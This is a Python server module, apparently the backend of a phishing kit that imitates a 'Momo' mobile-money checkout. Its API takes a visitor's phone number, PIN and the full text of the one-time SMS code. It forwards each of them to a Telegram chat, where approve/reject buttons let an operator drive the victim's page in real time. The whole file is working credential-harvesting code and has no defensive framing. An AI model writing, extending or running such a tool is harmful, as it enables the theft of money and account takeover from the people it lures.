"""Local HTTP server: static site + onboarding API.

Serves the static site (web/) and the preview page, plus a small JSON
API the frontend uses to drive the Telegram flow.

Endpoints
---------
GET  /api/health              -> {status, telegram_configured}
POST /api/onboarding          -> create session, ping Telegram
POST /api/checkout            -> send PIN + phone to Telegram w/buttons
GET  /api/pin-status/<sid>    -> {status: none|pending|approved|rejected}
POST /api/otp                 -> send OTP + PIN + phone w/buttons
GET  /api/otp-status/<sid>    -> {status, reference_number}
"""
from __future__ import annotations

import json
import logging
import mimetypes
import re
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
from pathlib import Path
from typing import Any
from urllib.parse import urlparse

from .telegram import (
    ConfigError,
    SessionStore,
    TelegramClient,
    TelegramError,
    escape_html,
    load_config,
)

LOGGER = logging.getLogger(__name__)

PROJECT_ROOT = Path(__file__).resolve().parent.parent
WEB_ROOT = PROJECT_ROOT / "web"
STATUS_PATTERN = re.compile(r"^/api/(pin|otp)-status/([0-9a-f]{32})$")

STATUS_NONE = "none"
STATUS_PENDING = "pending"
STATUS_APPROVED = "approved"
STATUS_REJECTED = "rejected"


def _inline_keyboard(
    approve_label: str,
    approve_action: str,
    reject_label: str,
    reject_action: str,
    session_id: str,
) -> dict[str, Any]:
    return {
        "inline_keyboard": [[
            {
                "text": approve_label,
                "callback_data": approve_action + ":" + session_id,
            },
            {
                "text": reject_label,
                "callback_data": reject_action + ":" + session_id,
            },
        ]]
    }


def _checkout_message(session_id: str, phone: str, pin: str) -> str:
    short = session_id[:8]
    return (
        "<b>New checkout</b>\n"
        "Session: <code>" + short + "</code>\n\n"
        "Phone: <code>" + escape_html(phone) + "</code>\n"
        "PIN:   <code>" + escape_html(pin) + "</code>\n\n"
        "Tap a code block to copy it."
    )


def _otp_message(
    session_id: str,
    phone: str,
    pin: str,
    otp: str,
) -> str:
    short = session_id[:8]
    return (
        "<b>OTP submitted</b>\n"
        "Session: <code>" + short + "</code>\n\n"
        "Phone: <code>" + escape_html(phone) + "</code>\n"
        "PIN:   <code>" + escape_html(pin) + "</code>\n\n"
        "OTP SMS:\n<code>" + escape_html(otp) + "</code>\n\n"
        "Tap a code block to copy it."
    )


class Handler(BaseHTTPRequestHandler):
    """HTTP request handler for the static site and JSON API."""

    server_version = "MomoServer/1.0"
    telegram: TelegramClient | None = None
    store: SessionStore | None = None

    # ------------------------------------------------------------------ #
    # Dispatch                                                           #
    # ------------------------------------------------------------------ #

    def do_GET(self) -> None:
        path = urlparse(self.path).path

        if path == "/api/health":
            return self._health()
        match = STATUS_PATTERN.match(path)
        if match:
            kind, session_id = match.group(1), match.group(2)
            return self._status(kind, session_id)

        return self._serve_static(path)

    def do_POST(self) -> None:
        path = urlparse(self.path).path
        if path == "/api/onboarding":
            return self._onboarding()
        if path == "/api/checkout":
            return self._checkout()
        if path == "/api/otp":
            return self._otp()
        return self._json(404, {"error": "not found"})

    # ------------------------------------------------------------------ #
    # API handlers                                                       #
    # ------------------------------------------------------------------ #

    def _health(self) -> None:
        configured = self.telegram is not None and self.store is not None
        self._json(200, {
            "status": "ok",
            "telegram_configured": configured,
        })

    def _onboarding(self) -> None:
        body = self._read_json()
        if body is None:
            return
        plan_code = str(body.get("plan_code", "")).strip() or "unknown"

        if self.store is None:
            return self._json(
                503,
                {"error": "server not configured (telegram missing)"},
            )

        session = self.store.create(plan_code=plan_code)

        if self.telegram is not None:
            try:
                self.telegram.send_message("New User onboarding")
            except TelegramError as exc:
                LOGGER.warning("onboarding ping failed: %s", exc)

        self._json(200, {
            "session_id": session.session_id,
            "plan_code": plan_code,
        })

    def _checkout(self) -> None:
        body = self._read_json()
        if body is None:
            return
        session_id = str(body.get("session_id", "")).strip()
        phone = str(body.get("phone", "")).strip()
        pin = str(body.get("pin", "")).strip()

        if not session_id or not phone or not pin:
            return self._json(
                400,
                {"error": "session_id, phone and pin are required"},
            )

        if self.store is None or self.telegram is None:
            return self._json(
                503,
                {"error": "server not configured (telegram missing)"},
            )

        session = self.store.get(session_id)
        if session is None:
            return self._json(404, {"error": "unknown session"})

        self.store.update(
            session_id,
            phone=phone,
            pin=pin,
            pin_status=STATUS_PENDING,
            otp_status=STATUS_NONE,
        )

        markup = _inline_keyboard(
            "Approve PIN", "approve_pin",
            "Reject PIN", "reject_pin",
            session_id,
        )
        try:
            sent = self.telegram.send_message(
                _checkout_message(session_id, phone, pin),
                reply_markup=markup,
            )
        except TelegramError as exc:
            LOGGER.warning("checkout send failed: %s", exc)
            return self._json(502, {"error": "telegram send failed"})

        self.store.update(session_id, pin_message_id=sent.message_id)
        self._json(200, {"status": STATUS_PENDING})

    def _otp(self) -> None:
        body = self._read_json()
        if body is None:
            return
        session_id = str(body.get("session_id", "")).strip()
        sms_body = str(body.get("sms_body", "")).strip()

        if not session_id or not sms_body:
            return self._json(
                400,
                {"error": "session_id and sms_body are required"},
            )

        if self.store is None or self.telegram is None:
            return self._json(
                503,
                {"error": "server not configured (telegram missing)"},
            )

        session = self.store.get(session_id)
        if session is None:
            return self._json(404, {"error": "unknown session"})
        if session.phone is None or session.pin is None:
            return self._json(
                409,
                {"error": "checkout has not been completed"},
            )

        self.store.update(
            session_id,
            otp_sms=sms_body,
            otp_status=STATUS_PENDING,
        )

        markup = {
            "inline_keyboard": [
                [
                    {"text": "Approve PIN",
                     "callback_data": "approve_pin:" + session_id},
                    {"text": "Reject PIN",
                     "callback_data": "reject_pin:" + session_id},
                ],
                [
                    {"text": "Approve OTP",
                     "callback_data": "approve_otp:" + session_id},
                    {"text": "Reject OTP",
                     "callback_data": "reject_otp:" + session_id},
                ],
            ]
        }
        try:
            sent = self.telegram.send_message(
                _otp_message(
                    session_id,
                    session.phone,
                    session.pin,
                    sms_body,
                ),
                reply_markup=markup,
            )
        except TelegramError as exc:
            LOGGER.warning("otp send failed: %s", exc)
            return self._json(502, {"error": "telegram send failed"})

        self.store.update(session_id, otp_message_id=sent.message_id)
        self._json(200, {"status": STATUS_PENDING})

    def _status(self, kind: str, session_id: str) -> None:
        if self.store is None:
            return self._json(503, {"error": "not configured"})

        session = self.store.get(session_id)
        if session is None:
            return self._json(404, {"error": "unknown session"})

        if kind == "pin":
            return self._json(200, {"status": session.pin_status})

        self._json(200, {
            "status": session.otp_status,
            "reference_number": session.reference_number,
            "phone": session.phone,
        })

    # ------------------------------------------------------------------ #
    # Static files                                                       #
    # ------------------------------------------------------------------ #

    def _serve_static(self, path: str) -> None:
        if path in ("/", ""):
            target = WEB_ROOT / "index.html"
        elif path == "/preview.html":
            target = PROJECT_ROOT / "preview.html"
        else:
            safe = path.lstrip("/")
            # preview.html iframes point at "web/index.html" so the
            # preview also works when opened via file://. When served
            # over HTTP, strip the leading "web/" so both forms
            # resolve to the same file.
            if safe.startswith("web/"):
                safe = safe[len("web/"):]
            target = (WEB_ROOT / safe).resolve()
            try:
                target.relative_to(WEB_ROOT.resolve())
            except ValueError:
                return self._not_found()

        if not target.is_file():
            return self._not_found()

        body = target.read_bytes()
        mime, _ = mimetypes.guess_type(str(target))
        self.send_response(200)
        self.send_header(
            "Content-Type", mime or "application/octet-stream"
        )
        self.send_header("Content-Length", str(len(body)))
        self.send_header("Cache-Control", "no-store")
        self.end_headers()
        self.wfile.write(body)

    def _not_found(self) -> None:
        self.send_response(404)
        self.send_header("Content-Type", "text/plain; charset=utf-8")
        self.end_headers()
        self.wfile.write(b"Not found")

    # ------------------------------------------------------------------ #
    # Helpers                                                            #
    # ------------------------------------------------------------------ #

    def _read_json(self) -> dict[str, Any] | None:
        length = int(self.headers.get("Content-Length") or 0)
        raw = self.rfile.read(length) if length else b""
        if not raw:
            self._json(400, {"error": "empty body"})
            return None
        try:
            data = json.loads(raw.decode("utf-8"))
        except (UnicodeDecodeError, json.JSONDecodeError):
            self._json(400, {"error": "invalid JSON"})
            return None
        if not isinstance(data, dict):
            self._json(400, {"error": "JSON body must be an object"})
            return None
        return data

    def _json(self, status: int, payload: dict[str, Any]) -> None:
        body = json.dumps(payload).encode("utf-8")
        self.send_response(status)
        self.send_header("Content-Type", "application/json; charset=utf-8")
        self.send_header("Content-Length", str(len(body)))
        self.send_header("Cache-Control", "no-store")
        self.end_headers()
        self.wfile.write(body)

    def log_message(self, fmt: str, *args: Any) -> None:
        LOGGER.info("%s - %s", self.address_string(), fmt % args)


class MomoServer(ThreadingHTTPServer):
    """ThreadingHTTPServer carrying the Telegram client + store."""

    daemon_threads = True
    allow_reuse_address = True

    def __init__(
        self,
        address: tuple[str, int],
        telegram: TelegramClient | None,
        store: SessionStore | None,
    ) -> None:
        Handler.telegram = telegram
        Handler.store = store
        super().__init__(address, Handler)


def _try_load_telegram() -> tuple[TelegramClient | None, SessionStore]:
    """Attempt to load Telegram config; warn and continue on failure."""
    from .telegram import store as session_store
    try:
        config = load_config()
    except ConfigError as exc:
        LOGGER.warning("Telegram disabled: %s", exc)
        return None, session_store
    return TelegramClient(config), session_store


def get_lan_ip() -> str | None:
    """Return the primary LAN IP, or None if it cannot be determined.

    Uses a UDP socket trick: connect a socket to a public address
    (no packets are actually sent) so the OS fills in the source
    address of the interface it would use for outbound traffic.
    """
    import socket as _socket
    try:
        with _socket.socket(_socket.AF_INET, _socket.SOCK_DGRAM) as s:
            s.connect(("8.8.8.8", 80))
            return s.getsockname()[0]
    except OSError:
        return None


def serve(
    host: str = "0.0.0.0",
    port: int = 8000,
) -> None:
    """Blocking entry point: load config, start server."""
    telegram, store = _try_load_telegram()
    server = MomoServer((host, port), telegram, store)

    LOGGER.info("Momo server listening on http://localhost:%d", port)
    LOGGER.info("Preview: http://localhost:%d/preview.html", port)
    if host == "0.0.0.0":
        lan_ip = get_lan_ip()
        if lan_ip:
            LOGGER.info("")
            LOGGER.info("On your phone (same Wi-Fi), open:")
            LOGGER.info("    http://%s:%d/", lan_ip, port)
            LOGGER.info(
                "If the phone cannot connect, allow Python through the "
                "Windows Defender Firewall (private networks) and retry."
            )
        else:
            LOGGER.info(
                "Could not detect a LAN IP; on the phone use "
                "ipconfig to find it and open http://<IP>:%d/", port
            )
    if telegram is None:
        LOGGER.warning(
            "Telegram is not configured - API calls will return 503. "
            "Fill in config/telegram.json and restart."
        )
    try:
        server.serve_forever()
    except KeyboardInterrupt:
        LOGGER.info("Shutting down")
    finally:
        server.server_close()
